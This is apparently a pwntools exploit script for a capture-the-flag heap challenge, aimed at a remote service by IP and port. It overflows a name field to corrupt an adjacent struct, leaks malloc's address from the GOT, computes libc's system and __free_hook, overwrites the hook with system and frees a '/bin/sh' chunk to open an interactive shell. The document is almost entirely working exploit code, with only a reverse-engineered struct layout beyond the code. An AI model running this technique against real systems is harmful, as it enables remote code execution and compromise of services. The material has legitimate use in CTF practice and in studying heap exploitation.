#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']

local = 0

if local:
	cn = process('./heap')
	bin = ELF('./heap')
	libc = ELF('./libc_local.so')
else:
	cn = remote('106.75.8.58', 23238)
	bin = ELF('./heap')
	libc = ELF('./remote_libc.so')


def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()


def add(name,namelen,schname,schnamelen):
	cn.sendline('1')
	cn.recvuntil('name')
	cn.sendline(str(namelen))
	cn.recvuntil('name')
	cn.sendline(name)
	cn.recvuntil('name')
	cn.sendline(str(schnamelen))
	cn.recvuntil('name')
	cn.sendline(schname)
	cn.recvuntil('tutor')
	cn.sendline('yes')

def remove(idx):
	cn.sendline('2')
	cn.recvuntil('delete')
	cn.sendline(str(idx))

def chg_name(idx,length,s):
	cn.sendline('3')
	cn.recvuntil('edit')
	cn.sendline(str(idx))
	cn.recvuntil('member')
	cn.sendline('1')
	cn.recvuntil('name')
	cn.sendline(str(length))
	cn.recvuntil('name')
	cn.sendline(s)

def chg_schname(idx,length,s):
	cn.sendline('3')
	cn.recvuntil('edit')
	cn.sendline(str(idx))
	cn.recvuntil('member')
	cn.sendline('2')
	cn.recvuntil('name')
	cn.sendline(str(length))
	cn.recvuntil('name')
	cn.sendline(s)
def intro(idx):
	cn.sendline('4')
	cn.recvuntil('id')
	cn.sendline(str(idx))
for i in range(100):
	add('',7,'',47)

p_rand_num=0x60F040

add('aaa',7,'aaa',7)#100
add('bbb',7,'bbb',7)#101

pay = 'A'*7+'\x00'+p64(0)+p64(0)+p64(0x65)+p32(101)+p32(0)+p64(p_rand_num)+p32(0xffffffff)
chg_schname(100,200,pay)


pay = '\x00'*4
chg_name(101,200,pay)


add('ccc',7,'ccc',7)#102
add('ddd',7,'ddd',7)#103

pay = 'A'*7+'\x00'+p64(0)+p64(0)+p64(0x65)+p32(103)+p32(0)+p64(bin.got['malloc'])+p32(p_rand_num-bin.got['malloc']-1)
chg_schname(102,200,pay)

intro(103)
cn.recvuntil('My name is ')
malloc = u64(cn.recv()[:6]+'\x00'*2)
success('malloc: '+hex(malloc))
freehook = malloc-libc.symbols['malloc']+libc.symbols['__free_hook']
system = malloc-libc.symbols['malloc']+libc.symbols['system']
success('freehook: '+hex(freehook))
success('system: '+hex(system))

pay = 'A'*7+'\x00'+p64(0)+p64(0)+p64(0x65)+p32(103)+p32(0)+p64(freehook)+p32(8)
chg_schname(102,200,pay)

pay = p64(system)
chg_name(103,200,pay)


add('/bin/sh',10,'/bin/sh',10)
remove(104)
#z()
cn.interactive()

'''
00000000 chunk_struc     struc ; (sizeof=0x38, mappedto_6)
	00000000 idx             dd ?                    ; base 10
	00000004 field_4         dd ?
	00000008 name            dq ?                    ; offset
	00000010 name_len        dd ?
	00000014 field_14        dd ?
	00000018 intro_func      dq ?
	00000020 sch_name        dq ?                    ; offset
	00000028 sch_name_len    dd ?
	0000002C is_tutor        dd ?
	00000030 randnum         dd ?
	00000034 field_34        dd ?
00000038 chunk_struc     ends
'''